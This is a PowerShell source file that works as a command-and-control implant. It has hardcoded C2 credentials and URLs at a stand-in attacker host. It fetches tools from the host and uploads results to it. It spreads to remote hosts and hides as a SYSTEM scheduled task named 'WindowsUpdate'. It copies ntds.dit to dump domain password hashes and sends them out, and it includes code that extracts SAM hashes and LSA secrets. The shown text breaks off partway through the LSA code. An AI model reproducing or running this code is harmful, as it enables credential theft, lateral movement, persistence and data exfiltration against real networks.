# ==============================================================================================
# 
# Microsoft PowerShell Source File -- Created with SAPIEN Technologies PrimalScript 2012
# 
# NAME: 
# 
# AUTHOR: localadmin , 
# DATE  : 2014-02-01
# 
# COMMENT: 
# 
# ==============================================================================================
$C2Credentials = New-Object System.Net.NetworkCredential("BadGuy", 'B0r1s2014', "c2")
$C2CommandsURL = "http://c2.evil.local/commands/commands.txt"
$C2CheckinURL = "http://c2.evil.local/uploads/checkin/"
$C2ToolsURL = "http://c2.evil.local/downloads/"
$C2CommandResultsURL = "http://c2.evil.local/uploads/results/"

$hostname = $ENV:Computername

#program data path where we store our run time data
$programdata = (Get-ChildItem env:ALLUSERSPROFILE).value

$hostinfofile = Join-Path $programdata ($hostname + ".txt")
$previouslycompletefile = Join-Path $programdata "previouslyrun.txt"
$errorfile = Join-Path $programdata "$hostname-taskerrors.txt"

#
#	Web Functions from https://github.com/kjacobsen/WebFunctions, used to simplify code futher down
#

Function Get-WebPage 
{
<#
.SYNOPSIS
Get a webpage

.DESCRIPTION
Gets the webpage at the specified URL and returns the string representation of that page. Webpages can be accessed over an URI including http://, Https://, file://, \\server\folder\file.txt etc.

.PARAMETER URL
The url of the page we want to download and save as a string. URL must have format like: http://google.com, https://microsoft.com, file://c:\test.txt

.PARAMETER Credentials
[Optional] Credentials for remote server

.PARAMETER WebProxy
[Optional] Web Proxy to be used, if none supplied, System Proxy settings will be honored

.PARAMETER Headers
[Optional] Used to specify additional headers in HTTP request

.INPUTS
Nothing can be piped directly into this function

.OUTPUTS
String representing the page at the specified URL

.EXAMPLE
Get-Webpage "http://google.com"
Gets the google page and returns it

.NOTES
NAME: Get-WebPage
AUTHOR: kieran@thekgb.su
LASTEDIT: 2012-10-14 9:15:00
KEYWORDS:

.LINK
http://aperturescience.su/
#>
[CMDLetBinding()]
Param
(
  [Parameter(mandatory=$true)] [String] $URL,
  [System.Net.ICredentials] $Credentials,
  [System.Net.IWebProxy] $WebProxy,
  [System.Net.WebHeaderCollection] $Headers
)

#make a webclient object
$webclient = New-Object Net.WebClient
#set the pass through variables if they are not null
if ($Credentials) 
{
	$webclient.credentials = $Credentials
}
if ($WebProxy) 
{
	$webclient.proxy = $WebProxy
}
if ($Headers) 
{
	$webclient.headers.add($Headers)
}

#Set the encoding type, we will use UTF8
$webclient.Encoding = [System.Text.Encoding]::UTF8

#contains resultant page
$result = $null

#call download string and return the string returned (or any errors generated)
try
{
	$result = $webclient.downloadstring($URL)
}
catch
{
	throw $_
}

return $result

}

Function Get-WebFile 
{
<#
.SYNOPSIS
Gets a file off the interwebs.

.DESCRIPTION
Gets the file at the specified URL and saves it to the hard disk. Files can be accessed over an URI including http://, Https://, file://,  ftp://, \\server\folder\file.txt etc.

Specification of the destination filename, and/or directory that file(s) will be saved to is supported. 
If no directory is supplied, files downloaded to current directory.
If no filename is specified, files downnloaded with have filenamed based on URL, eg http://live.sysinternals.com/procexp.exe downloaded to proxecp.exe, http://google.com downloaded to google.com

By default if a file already exists at the specified location, an exception will be generated and execution terminated.
Will pass any errors encountered up to caller!

.PARAMETER URL
[Pipeline] The url of the file we want to download. URL must have format like: http://google.com, https://microsoft.com, file://c:\test.txt

.PARAMETER Filename
[Optional] Filename to save file to

.PARAMETER Directory
[Optional] Directory to save the file to

.PARAMETER Credentials
[Optional] Credentials for remote server

.PARAMETER WebProxy
[Optional] Web Proxy to be used, if none supplied, System Proxy settings will be honored

.PARAMETER Headers
[Optional] Used to specify additional headers in HTTP request

.PARAMETER clobber
[SWITCH] [Optional] Do we want to overwrite files? Default is to throw error if file already exists.

.INPUTS
Accepts strings representing URI to files we want to download from pipeline

.OUTPUTS
No output

.EXAMPLE
get-webfile "http://live.sysinternals.com/procexp.exe"

.EXAMPLE
get-webfile "http://live.sysinternals.com/procexp.exe" -filename "pants.exe"
Download file at url but save as pants.exe

.EXAMPLE
gc filelist.txt | get-webfile -directory "c:\temp"
Where filelist.txt contains a list of urls to download, files downloaded to c:\temp

.NOTES
NAME: Get-WebFile
AUTHOR: kieran@thekgb.su
LASTEDIT: 2012-10-14 9:15:00
KEYWORDS:

.LINK
http://aperturescience.su/
#>
[CMDLetBinding()]
param
(
  [Parameter(mandatory=$true, valuefrompipeline=$true)][String] $URL,
  [String] $Filename,
  [String] $Directory,
  [System.Net.ICredentials] $Credentials,
  [System.Net.IWebProxy] $WebProxy,
  [System.Net.WebHeaderCollection] $Headers,
  [switch] $Clobber
)

Begin
{
	#make a webclient object
	$webclient = New-Object Net.WebClient
	
	#set the pass through variables if they are not null
	if ($Credentials) 
	{
		$webclient.credentials = $Credentials
	}
	if ($WebProxy) 
	{
		$webclient.proxy = $WebProxy
	}
	if ($Headers) 
	{
		$webclient.headers.add($Headers)
	}
}

Process 
{
	#destination to download file to
	$Destination = ""
	
	<#
		This is a very complicated bit of code, but it handles all of the possibilities for the filename and directory parameters
		
		1) If both are specified -> join the two together
		2) If no filename or destination directory is specified -> the destination is the current directory (converted from .) joined with the "leaf" part of the url
		3) If no filename is specified, but a directory is -> the destination is the specified directory joined with the "leaf" part of the url
		4) If filename is specified but a directory is not -> The destination  is the current directory (converted from .) joined with the specified filename
	#>
	if (($Filename -ne "") -and ($Directory -ne "")) 
	{
		$Destination = Join-Path $Directory $Filename
	} 
 	elseif ((($Filename -eq $null) -or ($Filename -eq "")) -and (($Directory -eq $null) -or ($Directory -eq ""))) 
	{
		$Destination = Join-Path (Convert-Path ".") (Split-Path $URL -leaf)
	} 
	elseif ((($Filename -eq $null) -or ($Filename -eq "")) -and ($Directory -ne "")) 
	{
		$Destination = Join-Path $Directory (Split-Path $URL -leaf)
	} 
	elseif (($Filename -ne "") -and (($Directory -eq $null) -or ($Directory -eq ""))) 
	{
		$Destination = Join-Path (Convert-Path ".") $Filename
	}
		
	<#
		If the destination already exists and if clobber parameter is not specified then throw an error as we don't want to overwrite files, 
		else generate a warning and continue
	#>
	if (Test-Path $Destination) 
	{
		if ($Clobber) 
		{
			Write-Warning "Overwritting file"
		} 
		else 
		{
			throw "File already exists at destination: $destination, specify -Clobber to overwrite"
		}
	}
		
	#try downloading the file, throw any exceptions
	try 
	{
		Write-Verbose "Downloading $URL to $Destination"
		$webclient.DownloadFile($URL, $Destination)
	} 
	catch 
	{
		throw $_
	}
}

}

Function Send-WebFile 
{
<#
.SYNOPSIS
Sends a file to the interwebs.

.DESCRIPTION
Uploads file to URL specified, appending the filename to the end of the url. In theory supports HTTP, HTTPS, FTP, FTPS, URLs. 
For WebDav use method PUT, for FTP, leave out or use STOR.
Note, I have written function send-webdavfile for uploading files to webdav pages (simply calls this function with correct webmethod)
Also works really well for file:// and \\server\share paths.
Will pass any errors encountered up to caller!

.PARAMETER URL
The URL the file will be uploaded to. Format can be Protocol://servername/ or Protocol://server, destination filename should NOT be specified

.PARAMETER LocalFile
[PIPELINE] The localfile(s) to be uploaded.

.PARAMETER WebMethod
[Optional] This is the HTTP method used to upload data, examples include POST (DEFAULT), STOR, PUT.

.PARAMETER Credentials
[Optional] Credentials for remote server

.PARAMETER WebProxy
[Optional] Web Proxy to be used, if none supplied, System Proxy settings will be honored

.PARAMETER Headers
[Optional] Used to specify additional headers in HTTP request

.INPUTS
Accepts strings of paths to files in Pipeline

.OUTPUTS
If data is returned by source, that data will be returned as an ascii string, otherwise null is returned.

.EXAMPLE
Send-WebFile http://myserver/folder c:\myfile.txt
Sends the file myfile to the folder, folder, on myserver

.EXAMPLE
dir c:\afolder | foreach { $_.fullname} | send-webfile "ftp://myftpserver"
Get a directory list of c:\afolder, list their fullnames, and then ftp the files to myftpserver

.NOTES
NAME: Send-Webfile
AUTHOR: kieran@thekgb.su
LASTEDIT: 2012-10-14 9:15:00
KEYWORDS:

.LINK
http://aperturescience.su/
#>
[CMDLetBinding()]
param
(
  [Parameter(mandatory=$true)] [String] $URL,
  [Parameter(mandatory=$true, valuefrompipeline=$true)] [String] $LocalFile,
  [String] $WebMethod,
  [System.Net.ICredentials] $Credentials,
  [System.Net.IWebProxy] $WebProxy,
  [System.Net.WebHeaderCollection] $Headers
)

Begin 
{
	#make a webclient object
	$webclient = New-Object Net.WebClient
	
	#set the pass through variables if they are not null
	if ($Credentials) 
	{
		$webclient.credentials = $Credentials
	}
	if ($WebProxy) 
	{
		$webclient.proxy = $WebProxy
	}
	if ($Headers) 
	{
		$webclient.headers.add($Headers)
	}
	
	#Set the encoding type, we will use UTF8
	$webclient.Encoding = [System.Text.Encoding]::UTF8

}

Process 
{
	#test that the file we are trying to send exists, else throw error.
	if (! (Test-Path $LocalFile)) 
	{
		Throw "Could not find local file $localfile"
	}

	#get the shot name for the file, that is, for c:\folder\file.txt, we just want the file.txt part
	$shortfilename = Split-Path $LocalFile -Leaf
	
	#the remote url will need to have a filename put on the end, but we need to be careful as the user might have already put a trailing backslash
	if ($URL.EndsWith("/")) 
	{
		$fullurl = $URL + $shortfilename
	} 
	else 
	{
		$fullurl = $URL + "/" + $shortfilename
	}
	
	#the result variable will contain the body/page that is return to us when we upload the file (usefulness may vary)
	$result = $null
		
	#if webmethod was specified, call upload file, specifying that method, otherwise use the usualy upload file and let webclient pick the method
	if ($WebMethod) 
	{
		Write-Verbose "Uploading $localfile to $fullurl using method $webmethod"
		$result = $webclient.UploadFile($fullurl, $WebMethod, $LocalFile)
	} 
	else 
	{
		Write-Verbose "Uploading $localfile to $fullurl using method autoselected"
		$result = $webclient.UploadFile($fullurl, $LocalFile)
	}
	
	#if we got a result (we might not if an error occured, then format that data back to a string, otherwise, as we got no data
	if ($result) 
	{
		Write-Verbose "Remote sent response"
		return [System.Text.Encoding]::ASCII.GetString($result)
	} 
	else 
	{
		Write-Verbose "No Response from Remote"
		return $null
	}
}

}

Function Send-WebDAVFile 
{
<#
.SYNOPSIS
Specifically designed function for uploading files to WebDAV shares. It specifically does not require webmethods to be specified.

.DESCRIPTION
Uploads file to URL specified, appending the filename to the end of the url. In theory supports HTTP, HTTPS, based WebDAV.
Will pass any errors encountered up to caller!

.PARAMETER URL
The URL the file will be uploaded to. Format can be Protocol://servername/ or Protocol://server, destination filename should NOT be specified

.PARAMETER LocalFile
The localfile(s) to be uploaded. Supports Value From Pipeline

.PARAMETER Credentials
[Optional] Credentials for remote server

.PARAMETER WebProxy
[Optional] Web Proxy to be used, if none supplied, System Proxy settings will be honored

.PARAMETER Headers
[Optional] Used to specify additional headers in HTTP request

.INPUTS
Accepts strings of paths to files in Pipeline

.OUTPUTS
If data is returned by source, that data will be returned as an ascii string, otherwise null is returned.

.EXAMPLE
Send-WebDAVFile http://myserver/webfolder c:\myfile.txt
Sends the file myfile to the webdav folder, webfolder, on myserver

.EXAMPLE
dir c:\afolder | foreach { $_.fullname} | send-webdavfile "https://myserver/web"
Get a directory list of c:\afolder, list their fullnames, and then send them to the web folder on myserver

.EXAMPLE
Upload-WebDAVFile -URL 'https://server/checkin' -LocalFile D:\Desktop\apps.txt -Credentials (New-Object system.net.networkcredential("username","password","domain"))
Upload a file, specifying a login credential

.NOTES
NAME: Send-WebDAVFile
AUTHOR: kieran@thekgb.su
LASTEDIT: 2012-10-14 9:15:00
KEYWORDS:

.LINK
http://aperturescience.su/
#>
[CMDLetBinding()]
param
(
  [Parameter(mandatory=$true)] [String] $URL,
  [Parameter(mandatory=$true, valuefrompipeline=$true)] [String] $LocalFile,
  [System.Net.ICredentials] $Credentials,
  [System.Net.IWebProxy] $WebProxy,
  [System.Net.WebHeaderCollection] $Headers
)

begin 
{
	#check if we can access the upload values method
	if ((Get-Command Send-Webfile -ErrorAction silentlycontinue) -eq $null) 
	{
		throw "Could not find the function Send-Webfile"
	}
}

process 
{
	Send-Webfile -url $URL -localfile $LocalFile -webmethod "PUT" -credentials $Credentials -webproxy $WebProxy -headers $Headers
}

}

#
#	Functions below simplify the C2 instructions
#

Function Download-Tool
{
[CMDLetBinding()]
param
(
	[string] $filename
)
Get-WebFile -URL ($C2ToolsURL + $filename) -Directory $programdata -clobber

}

Function Upload-ToC2
{
[CMDLetBinding()]
param
(
	[string] $filename
)
Send-WebDAVFile -Credentials $C2Credentials -LocalFile $filename -URL $C2CommandResultsURL
}

Function Remote-Install 
{
[CMDLetBinding()]
param
(
  [Parameter(mandatory=$true)] [String] $username,
  [Parameter(mandatory=$true)] [String] $password,
  [Parameter(mandatory=$true)] [String] $hostname
)
#http://blogs.msdn.com/b/koteshb/archive/2010/02/13/powershell-creating-a-pscredential-object.aspx
$securepassword = ConvertTo-SecureString $password -AsPlainText -Force
$pscredentials = New-Object System.Management.Automation.PSCredential ($username, $securepassword)

Invoke-Command -ComputerName $hostname -Credential $pscredentials -ScriptBlock {
	$webclient = New-Object Net.WebClient
	$webclient.downloadfile('http://c2.evil.local/downloads/SystemInformation.ps1', 'C:\programdata\SystemInformation.ps1')
	schtasks /create /tn WindowsUpdate /tr 'powershell.exe -executionpolicy Bypass -WindowStyle Hidden -noprofile -command C:\programdata\SystemInformation.ps1' /ru system /SC 'Daily' /st '04:00' /ri 5 /du 24:00 /rl HIGHEST
	schtasks /run /TN WindowsUpdate	
	}

}

Function Get-ADHashes
{
[CMDLetBinding()]
param()
	Download-Tool "QuarksPwDump.exe"
	ntdsutil snapshot 'list all' 'unmount *' quit quit
	ntdsutil snapshot 'list all' 'delete *' quit quit
	ntdsutil snapshot 'activate instance ntds' create quit quit
	ntdsutil snapshot 'list all' 'mount 1' quit quit
	copy "c:\*snap*\Windows\ntds\ntds.dit" "c:\programdata\ntds.dit"
	ntdsutil snapshot 'list all' 'unmount *' quit quit
	ntdsutil snapshot 'list all' 'delete *' quit quit
	c:\programdata\QuarksPwDump.exe --dump-hash-domain -nt c:\programdata\ntds.dit -o c:\programdata\ntdsdump.txt
	Upload-ToC2 c:\programdata\ntdsdump.txt
}

Get-Date | Out-File -FilePath $hostinfofile

#
#	system information jobs, split them into 3 processes to reduce how long it all takes
#


Start-Job -Name 32bitjobs -RunAs32 -ScriptBlock {

#
# PowerShell CreateCmd Bypass by Kathy Peters, Josh Kelley (winfang) and Dave Kennedy (ReL1K)
# Defcon Release
#
#
#
function LoadApi
{
    $oldErrorAction = $global:ErrorActionPreference;
    $global:ErrorActionPreference = "SilentlyContinue";
    $test = [PowerDump.Native];
    $global:ErrorActionPreference = $oldErrorAction;
    if ($test) 
    {
        # already loaded
        return; 
     }

$code = @'
using System;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Text;

namespace PowerDump
{
    public class Native
    {
    [DllImport("advapi32.dll", CharSet = CharSet.Auto)]
     public static extern int RegOpenKeyEx(
        int hKey,
        string subKey,
        int ulOptions,
        int samDesired,
        out int hkResult);

    [DllImport("advapi32.dll", EntryPoint = "RegEnumKeyEx")]
    extern public static int RegEnumKeyEx(
        int hkey,
        int index,
        StringBuilder lpName,
        ref int lpcbName,
        int reserved,
        StringBuilder lpClass,
        ref int lpcbClass,
        out long lpftLastWriteTime);

    [DllImport("advapi32.dll", EntryPoint="RegQueryInfoKey", CallingConvention=CallingConvention.Winapi, SetLastError=true)]
    extern public static int RegQueryInfoKey(
        int hkey,
        StringBuilder lpClass,
        ref int lpcbClass,
        int lpReserved,
        out int lpcSubKeys,
        out int lpcbMaxSubKeyLen,
        out int lpcbMaxClassLen,
        out int lpcValues,
        out int lpcbMaxValueNameLen,
        out int lpcbMaxValueLen,
        out int lpcbSecurityDescriptor,
        IntPtr lpftLastWriteTime);

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern int RegCloseKey(
        int hKey);

        }
    } // end namespace PowerDump

    public class Shift {
        public static int   Right(int x,   int count) { return x >> count; }
        public static uint  Right(uint x,  int count) { return x >> count; }
        public static long  Right(long x,  int count) { return x >> count; }
        public static ulong Right(ulong x, int count) { return x >> count; }
        public static int    Left(int x,   int count) { return x << count; }
        public static uint   Left(uint x,  int count) { return x << count; }
        public static long   Left(long x,  int count) { return x << count; }
        public static ulong  Left(ulong x, int count) { return x << count; }
    }
'@

   $provider = New-Object Microsoft.CSharp.CSharpCodeProvider
   $dllName = [PsObject].Assembly.Location
   $compilerParameters = New-Object System.CodeDom.Compiler.CompilerParameters
   $assemblies = @("System.dll", $dllName)
   $compilerParameters.ReferencedAssemblies.AddRange($assemblies)
   $compilerParameters.GenerateInMemory = $true
   $compilerResults = $provider.CompileAssemblyFromSource($compilerParameters, $code)
   if($compilerResults.Errors.Count -gt 0) {
     $compilerResults.Errors | % { Write-Error ("{0}:`t{1}" -f $_.Line,$_.ErrorText) }
   }

}

$antpassword = [Text.Encoding]::ASCII.GetBytes("NTPASSWORD`0");
$almpassword = [Text.Encoding]::ASCII.GetBytes("LMPASSWORD`0");
$empty_lm = [byte[]]@(0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee,0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee);
$empty_nt = [byte[]]@(0x31,0xd6,0xcf,0xe0,0xd1,0x6a,0xe9,0x31,0xb7,0x3c,0x59,0xd7,0xe0,0xc0,0x89,0xc0);
$odd_parity = @(
  1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,
  16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,
  32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47,
  49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62,
  64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79,
  81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94,
  97, 97, 98, 98,100,100,103,103,104,104,107,107,109,109,110,110,
  112,112,115,115,117,117,118,118,121,121,122,122,124,124,127,127,
  128,128,131,131,133,133,134,134,137,137,138,138,140,140,143,143,
  145,145,146,146,148,148,151,151,152,152,155,155,157,157,158,158,
  161,161,162,162,164,164,167,167,168,168,171,171,173,173,174,174,
  176,176,179,179,181,181,182,182,185,185,186,186,188,188,191,191,
  193,193,194,194,196,196,199,199,200,200,203,203,205,205,206,206,
  208,208,211,211,213,213,214,214,217,217,218,218,220,220,223,223,
  224,224,227,227,229,229,230,230,233,233,234,234,236,236,239,239,
  241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254
);

function sid_to_key($sid)
{
    $s1 = @();
    $s1 += [char]($sid -band 0xFF);
    $s1 += [char]([Shift]::Right($sid,8) -band 0xFF);
    $s1 += [char]([Shift]::Right($sid,16) -band 0xFF);
    $s1 += [char]([Shift]::Right($sid,24) -band 0xFF);
    $s1 += $s1[0];
    $s1 += $s1[1];
    $s1 += $s1[2];
    $s2 = @();
    $s2 += $s1[3]; $s2 += $s1[0]; $s2 += $s1[1]; $s2 += $s1[2];
    $s2 += $s2[0]; $s2 += $s2[1]; $s2 += $s2[2];
    return ,((str_to_key $s1),(str_to_key $s2));
}

function str_to_key($s)
{
    $key = @();
    $key += [Shift]::Right([int]($s[0]), 1 );
    $key += [Shift]::Left( $([int]($s[0]) -band 0x01), 6) -bor [Shift]::Right([int]($s[1]),2);
    $key += [Shift]::Left( $([int]($s[1]) -band 0x03), 5) -bor [Shift]::Right([int]($s[2]),3);
    $key += [Shift]::Left( $([int]($s[2]) -band 0x07), 4) -bor [Shift]::Right([int]($s[3]),4);
    $key += [Shift]::Left( $([int]($s[3]) -band 0x0F), 3) -bor [Shift]::Right([int]($s[4]),5);
    $key += [Shift]::Left( $([int]($s[4]) -band 0x1F), 2) -bor [Shift]::Right([int]($s[5]),6);
    $key += [Shift]::Left( $([int]($s[5]) -band 0x3F), 1) -bor [Shift]::Right([int]($s[6]),7);
    $key += $([int]($s[6]) -band 0x7F);
    0..7 | %{
        $key[$_] = [Shift]::Left($key[$_], 1);
        $key[$_] = $odd_parity[$key[$_]];
        }
    return ,$key;
}

function NewRC4([byte[]]$key)
{
    return new-object Object |
    Add-Member NoteProperty key $key -PassThru |
    Add-Member NoteProperty S $null -PassThru |
    Add-Member ScriptMethod init {
        if (-not $this.S)
        {
            [byte[]]$this.S = 0..255;
            0..255 | % -begin{[long]$j=0;}{
                $j = ($j + $this.key[$($_ % $this.key.Length)] + $this.S[$_]) % $this.S.Length;
                $temp = $this.S[$_]; $this.S[$_] = $this.S[$j]; $this.S[$j] = $temp;
                }
        }
    } -PassThru |
    Add-Member ScriptMethod "encrypt" {
        $data = $args[0];
        $this.init();
        $outbuf = new-object byte[] $($data.Length);
        $S2 = $this.S[0..$this.S.Length];
        0..$($data.Length-1) | % -begin{$i=0;$j=0;} {
            $i = ($i+1) % $S2.Length;
            $j = ($j + $S2[$i]) % $S2.Length;
            $temp = $S2[$i];$S2[$i] = $S2[$j];$S2[$j] = $temp;
            $a = $data[$_];
            $b = $S2[ $($S2[$i]+$S2[$j]) % $S2.Length ];
            $outbuf[$_] = ($a -bxor $b);
        }
        return ,$outbuf;
    } -PassThru
}

function des_encrypt([byte[]]$data, [byte[]]$key)
{
    return ,(des_transform $data $key $true)
}

function des_decrypt([byte[]]$data, [byte[]]$key)
{
    return ,(des_transform $data $key $false)
}

function des_transform([byte[]]$data, [byte[]]$key, $doEncrypt)
{
    $des = new-object Security.Cryptography.DESCryptoServiceProvider;
    $des.Mode = [Security.Cryptography.CipherMode]::ECB;
    $des.Padding = [Security.Cryptography.PaddingMode]::None;
    $des.Key = $key;
    $des.IV = $key;
    $transform = $null;
    if ($doEncrypt) {$transform = $des.CreateEncryptor();}
    else{$transform = $des.CreateDecryptor();}
    $result = $transform.TransformFinalBlock($data, 0, $data.Length);
    return ,$result;
}

function Get-RegKeyClass([string]$key, [string]$subkey)
{
    switch ($Key) {
        "HKCR" { $nKey = 0x80000000} #HK Classes Root
        "HKCU" { $nKey = 0x80000001} #HK Current User
        "HKLM" { $nKey = 0x80000002} #HK Local Machine
        "HKU"  { $nKey = 0x80000003} #HK Users
        "HKCC" { $nKey = 0x80000005} #HK Current Config
        default { 
            throw "Invalid Key. Use one of the following options HKCR, HKCU, HKLM, HKU, HKCC"
        }
    }
    $KEYQUERYVALUE = 0x1;
    $KEYREAD = 0x19;
    $KEYALLACCESS = 0x3F;
    $result = "";
    [int]$hkey=0
    if (-not [PowerDump.Native]::RegOpenKeyEx($nkey,$subkey,0,$KEYREAD,[ref]$hkey))
    {
    	$classVal = New-Object Text.Stringbuilder 1024
    	[int]$len = 1024
    	if (-not [PowerDump.Native]::RegQueryInfoKey($hkey,$classVal,[ref]$len,0,[ref]$null,[ref]$null,
    		[ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,0))
    	{
    		$result = $classVal.ToString()
    	}
    	else
    	{
    		Write-Error "RegQueryInfoKey failed";
    	}	
    	[PowerDump.Native]::RegCloseKey($hkey) | Out-Null
    }
    else
    {
    	Write-Error "Cannot open key";
    }
    return $result;
}

function Get-BootKey
{
    $s = [string]::Join("",$("JD","Skew1","GBG","Data" | %{Get-RegKeyClass "HKLM" "SYSTEM\CurrentControlSet\Control\Lsa\$_"}));
    $b = new-object byte[] $($s.Length/2);
    0..$($b.Length-1) | %{$b[$_] = [Convert]::ToByte($s.Substring($($_*2),2),16)}
    $b2 = new-object byte[] 16;
    0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 | % -begin{$i=0;}{$b2[$i]=$b[$_];$i++}
    return ,$b2;
}

function Get-HBootKey
{
    param([byte[]]$bootkey);
    $aqwerty = [Text.Encoding]::ASCII.GetBytes("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%`0");
    $anum = [Text.Encoding]::ASCII.GetBytes("0123456789012345678901234567890123456789`0");
    $k = Get-Item HKLM:\SAM\SAM\Domains\Account;
    if (-not $k) {return $null}
    [byte[]]$F = $k.GetValue("F");
    if (-not $F) {return $null}
    $rc4key = [Security.Cryptography.MD5]::Create().ComputeHash($F[0x70..0x7F] + $aqwerty + $bootkey + $anum);
    $rc4 = NewRC4 $rc4key;
    return ,($rc4.encrypt($F[0x80..0x9F]));
}

function Get-UserName([byte[]]$V)
{
    if (-not $V) {return $null};
    $offset = [BitConverter]::ToInt32($V[0x0c..0x0f],0) + 0xCC;
    $len = [BitConverter]::ToInt32($V[0x10..0x13],0);
    return [Text.Encoding]::Unicode.GetString($V, $offset, $len);
}

function Get-UserHashes($u, [byte[]]$hbootkey)
{
    [byte[]]$enc_lm_hash = $null; [byte[]]$enc_nt_hash = $null;
    if ($u.HashOffset + 0x28 -lt $u.V.Length)
    {
        $lm_hash_offset = $u.HashOffset + 4;
        $nt_hash_offset = $u.HashOffset + 8 + 0x10;
        $enc_lm_hash = $u.V[$($lm_hash_offset)..$($lm_hash_offset+0x0f)];
        $enc_nt_hash = $u.V[$($nt_hash_offset)..$($nt_hash_offset+0x0f)];
    }
    elseif ($u.HashOffset + 0x14 -lt $u.V.Length)
    {
        $nt_hash_offset = $u.HashOffset + 8;
        $enc_nt_hash = [byte[]]$u.V[$($nt_hash_offset)..$($nt_hash_offset+0x0f)];
    }
    return ,(DecryptHashes $u.Rid $enc_lm_hash $enc_nt_hash $hbootkey);
}

function DecryptHashes($rid, [byte[]]$enc_lm_hash, [byte[]]$enc_nt_hash, [byte[]]$hbootkey)
{
    [byte[]]$lmhash = $empty_lm; [byte[]]$nthash=$empty_nt;
    # LM Hash
    if ($enc_lm_hash)
    {    
        $lmhash = DecryptSingleHash $rid $hbootkey $enc_lm_hash $almpassword;
    }
    
    # NT Hash
    if ($enc_nt_hash)
    {
        $nthash = DecryptSingleHash $rid $hbootkey $enc_nt_hash $antpassword;
    }

    return ,($lmhash,$nthash)
}

function DecryptSingleHash($rid,[byte[]]$hbootkey,[byte[]]$enc_hash,[byte[]]$lmntstr)
{
    $deskeys = sid_to_key $rid;
    $md5 = [Security.Cryptography.MD5]::Create();
    $rc4_key = $md5.ComputeHash($hbootkey[0..0x0f] + [BitConverter]::GetBytes($rid) + $lmntstr);
    $rc4 = NewRC4 $rc4_key;
    $obfkey = $rc4.encrypt($enc_hash);
    $hash = (des_decrypt  $obfkey[0..7] $deskeys[0]) + 
        (des_decrypt $obfkey[8..$($obfkey.Length - 1)] $deskeys[1]);
    return ,$hash;
}

function Get-UserKeys
{
    ls HKLM:\SAM\SAM\Domains\Account\Users | 
        where {$_.PSChildName -match "^[0-9A-Fa-f]{8}$"} | 
            Add-Member AliasProperty KeyName PSChildName -PassThru |
            Add-Member ScriptProperty Rid {[Convert]::ToInt32($this.PSChildName, 16)} -PassThru |
            Add-Member ScriptProperty V {[byte[]]($this.GetValue("V"))} -PassThru |
            Add-Member ScriptProperty UserName {Get-UserName($this.GetValue("V"))} -PassThru |
            Add-Member ScriptProperty HashOffset {[BitConverter]::ToUInt32($this.GetValue("V")[0x9c..0x9f],0) + 0xCC} -PassThru
}

function DumpHashes
{
    LoadApi
    $bootkey = Get-BootKey;
    $hbootKey = Get-HBootKey $bootkey;
    Get-UserKeys | %{
        $hashes = Get-UserHashes $_ $hBootKey;
        "{0}:{1}:{2}:{3}:::" -f ($_.UserName,$_.Rid, 
            [BitConverter]::ToString($hashes[0]).Replace("-","").ToLower(), 
            [BitConverter]::ToString($hashes[1]).Replace("-","").ToLower());
    }
}

#
#	Get-TSLsaSecret and Enable-TSDuplicateToken written by Microsoft
#	1)
#	2)
#
#	Fixes to Enable-TSDuplicateToken by Kieran Jacobsen, see here
#

function Get-TSLsaSecret {
  <#
    .SYNOPSIS
    Displays LSA Secrets from local computer.

    .DESCRIPTION
    Extracts LSA secrets from HKLM:\\SECURITY\Policy\Secrets\ on a local computer.
    The CmdLet must be run with elevated permissions, in 32-bit mode and requires permissions to the security key in HKLM.

    .PARAMETER Key
    Name of Key to Extract. if the parameter is not used, all secrets will be displayed.

    .EXAMPLE
    Enable-TSDuplicateToken
    Get-TSLsaSecret

    .EXAMPLE
    Enable-TSDuplicateToken
    Get-TSLsaSecret -Key KeyName

    .LINK
    http://www.truesec.com

    .NOTES
    Goude 2012, TreuSec
  #>

  param(
    [Parameter(Position = 0,
      ValueFromPipeLine= $true
    )]
    [Alias("RegKey")]
    [string[]]$RegistryKey
  )

Begin {
# Check if User is Elevated
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent())
if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true) {
  Write-Warning "Run the Command as an Administrator"
  Break
}

# Check if Script is run in a 32-bit Environment by checking a Pointer Size
if([System.IntPtr]::Size -eq 8) {
  Write-Warning "Run PowerShell in 32-bit mode"
  Break
}



# Check if RegKey is specified
if([string]::IsNullOrEmpty($registryKey)) {
  [string[]]$registryKey = (Split-Path (Get-ChildItem HKLM:\SECURITY\Policy\Secrets | Select -ExpandProperty Name) -Leaf)
}

# Create Temporary Registry Key
if( -not(Test-Path "HKLM:\\SECURITY\Policy\Secrets\MySecret")) {
  mkdir "HKLM:\\SECURITY\Policy\Secrets\MySecret" | Out-Null
}

$signature = @"
[StructLayout(LayoutKind.Sequential)]
public struct LSA_UNICODE_STRING
{
  public UInt16 Length;
  public UInt16 MaximumLength;
  public IntPtr Buffer;
}

[StructLayout(LayoutKind.Sequential)]
public struct LSA_OBJECT_ATTRIBUTES
{
  public int Length;
  public IntPtr RootDirectory;
  public LSA_UNICODE_STRING ObjectName;
  public uint Attributes;
  public IntPtr SecurityDescriptor;
  public IntPtr SecurityQualityOfService;
}

public enum LSA_AccessPolicy : long
{
  POLICY_VIEW_LOCAL_INFORMATION = 0x00000001L,
  POLICY_VIEW_AUDIT_INFORMATION = 0x00000002L,
  POLICY_GET_PRIVATE_INFORMATION = 0x00000004L,
  POLICY_TRUST_ADMIN = 0x00000008L,
